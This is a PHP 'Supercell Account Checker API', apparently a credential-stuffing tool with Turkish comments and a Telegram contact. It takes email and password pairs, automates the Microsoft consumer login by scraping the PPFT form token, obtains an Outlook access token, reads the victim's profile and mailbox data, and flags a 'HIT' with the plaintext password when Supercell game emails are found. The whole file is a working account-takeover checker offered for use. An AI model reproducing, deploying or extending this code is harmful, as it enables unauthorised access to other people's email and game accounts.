<?php
/**
 * Supercell Account Checker API
 * Microsoft Login üzerinden Supercell oyunları kontrolü
 * telegram : @unutur
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');

// Rate limit koruması
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$limit_file = 'rate_limit_' . md5($ip) . '.json';

// Rate limit kontrolü (dakikada 10 istek)
$rate_limit = 10;
$time_window = 60;

if (file_exists($limit_file)) {
    $data = json_decode(file_get_contents($limit_file), true);
    $requests = $data['requests'] ?? [];
    $requests = array_filter($requests, function($t) use ($time_window) {
        return $t > time() - $time_window;
    });
    
    if (count($requests) >= $rate_limit) {
        echo json_encode([
            'success' => false,
            'error' => '❌ Rate limit aşıldı. ' . $rate_limit . ' istek/' . $time_window . ' saniye',
            'wait' => $time_window - (time() - min($requests)),
            'telegram' => '@unutur'
        ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
        exit;
    }
    
    $requests[] = time();
    file_put_contents($limit_file, json_encode(['requests' => $requests]));
} else {
    file_put_contents($limit_file, json_encode(['requests' => [time()]]));
}

$email = isset($_GET['email']) ? trim($_GET['email']) : '';
$password = isset($_GET['password']) ? trim($_GET['password']) : '';

if (empty($email) || empty($password)) {
    echo json_encode([
        'success' => false,
        'error' => '❌ Email ve şifre gerekli',
        'ornek' => '/?email=ornek@outlook.com&password=123456',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
    echo json_encode([
        'success' => false,
        'error' => '❌ Geçersiz email formatı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

function sendRequest($url, $method = 'GET', $data = null, $headers = [], $cookies = []) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    }
    
    if (!empty($headers)) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
    
    if (!empty($cookies)) {
        $cookie_str = '';
        foreach ($cookies as $key => $value) {
            $cookie_str .= "$key=$value; ";
        }
        curl_setopt($ch, CURLOPT_COOKIE, $cookie_str);
    }
    
    $response = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return ['response' => $response, 'http_code' => $http_code];
}

// Step 1: Get IDP
$url1 = "https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=" . urlencode($email);
$result1 = sendRequest($url1);

if (strpos($result1['response'], 'MSAccount') === false) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'BAD',
        'reason' => 'Microsoft hesabı değil',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Step 2: Get login page
$url2 = "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=" . urlencode($email) . "&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D";
$result2 = sendRequest($url2);

preg_match('/urlPost":"([^"]+)"/', $result2['response'], $url_match);
preg_match('/name=\\\\"PPFT\\\\" id=\\\\"i0327\\\\" value=\\\\"([^"]+)\\\\"/', $result2['response'], $ppft_match);

if (empty($url_match) || empty($ppft_match)) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'ERROR',
        'reason' => 'Login form alınamadı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$post_url = str_replace('\/', '/', $url_match[1]);
$ppft = $ppft_match[1];
$login_data = "i13=1&login=" . urlencode($email) . "&loginfmt=" . urlencode($email) . "&type=11&LoginOptions=1&passwd=" . urlencode($password) . "&PPFT=$ppft&PPSX=PassportR";

// Step 3: Post login
$headers3 = [
    'Content-Type: application/x-www-form-urlencoded',
    'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin: https://login.live.com',
    'Referer: ' . $result2['response']
];
$result3 = sendRequest($post_url, 'POST', $login_data, $headers3, ['MSPCID' => '']);

if (strpos($result3['response'], 'account or password is incorrect') !== false) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'BAD',
        'reason' => 'Şifre hatalı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Get location and code
preg_match('/Location: ([^\n]+)/', $result3['response'], $location_match);
if (empty($location_match)) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'ERROR',
        'reason' => 'Redirect alınamadı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

preg_match('/code=([^&]+)/', $location_match[1], $code_match);
if (empty($code_match)) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'ERROR',
        'reason' => 'Authorization code alınamadı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$code = $code_match[1];

// Step 4: Get access token
$token_data = "client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=$code&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access";
$token_headers = ['Content-Type: application/x-www-form-urlencoded'];
$token_result = sendRequest('https://login.microsoftonline.com/consumers/oauth2/v2.0/token', 'POST', $token_data, $token_headers);

$token_json = json_decode($token_result['response'], true);
if (empty($token_json['access_token'])) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'ERROR',
        'reason' => 'Access token alınamadı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

$access_token = $token_json['access_token'];

// Step 5: Get profile
$profile_headers = [
    'User-Agent: Outlook-Android/2.0',
    'Authorization: Bearer ' . $access_token
];
$profile_result = sendRequest('https://substrate.office.com/profileb2/v2.0/me/V1Profile', 'GET', null, $profile_headers);

$profile = json_decode($profile_result['response'], true);
$name = $profile['displayName'] ?? '';
$country = $profile['location'] ?? '';

// Step 6: Check Supercell emails
$supercell_headers = [
    'authorization: Bearer ' . $access_token,
    'user-agent: Mozilla/5.0 (Android)'
];
$supercell_result = sendRequest("https://outlook.live.com/owa/$email/startupdata.ashx?app=Mini&n=0", 'POST', '', $supercell_headers);

$response_text = $supercell_result['response'];

// Supercell oyunlarını kontrol et
$games = [
    'clash_royale' => 'Clash Royale',
    'brawl_stars' => 'Brawl Stars', 
    'clash_of_clans' => 'Clash of Clans',
    'hay_day' => 'Hay Day'
];

$found_games = [];
foreach ($games as $key => $game) {
    if (strpos($response_text, $game) !== false) {
        $found_games[] = $key;
    }
}

if (strpos($response_text, 'noreply@id.supercell.com') === false) {
    echo json_encode([
        'success' => false,
        'email' => $email,
        'status' => 'FREE',
        'reason' => 'Supercell mail bulunamadı',
        'telegram' => '@unutur'
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    exit;
}

// Başarılı sonuç
echo json_encode([
    'success' => true,
    'email' => $email,
    'password' => $password,
    'status' => 'HIT',
    'games' => $found_games,
    'clash_royale' => in_array('clash_royale', $found_games),
    'brawl_stars' => in_array('brawl_stars', $found_games),
    'clash_of_clans' => in_array('clash_of_clans', $found_games),
    'hay_day' => in_array('hay_day', $found_games),
    'display_name' => $name,
    'country' => $country,
    'telegram' => '@unutur'
], JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
?>